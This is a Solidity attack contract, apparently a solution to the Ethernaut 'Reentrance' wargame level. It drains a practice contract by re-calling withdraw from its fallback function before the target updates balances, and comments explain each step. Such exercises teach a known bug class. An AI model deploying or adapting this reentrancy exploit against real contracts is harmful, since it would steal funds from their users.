// # Ethernaut 10: Reentrance
//
// This contract should be deployed with an ether value that
// divides the `Reentrance` contract's balance without remainder.
// Ethernaut deploys `Reentrance` with 1 ether.

pragma solidity ^0.6.0;

import "./10_Reentrance.sol";

contract ReentranceAttack {
    Reentrance instance;
    uint withdrawAmount;

    constructor (address payable instanceAddr) payable public {
        instance = Reentrance(instanceAddr);
    }

    // In order to call `withdraw` repeatedly before anything is subtracted from
    // our balance, we are required to have a non-zero balance to begin with.
    function drainVictim () public {
        withdrawAmount = address(this).balance;
        instance.donate.value(withdrawAmount)(address(this));
        instance.withdraw(withdrawAmount);
    }

    // When `Reentrance` sends us back our 'donation', this contract's `fallback`
    // function is executed and can issue `withdraw` to send us more ether before our
    // balance is updated.
    fallback () payable external {
        if (address(instance).balance > 0) {
            instance.withdraw(withdrawAmount);
        }
    }
}
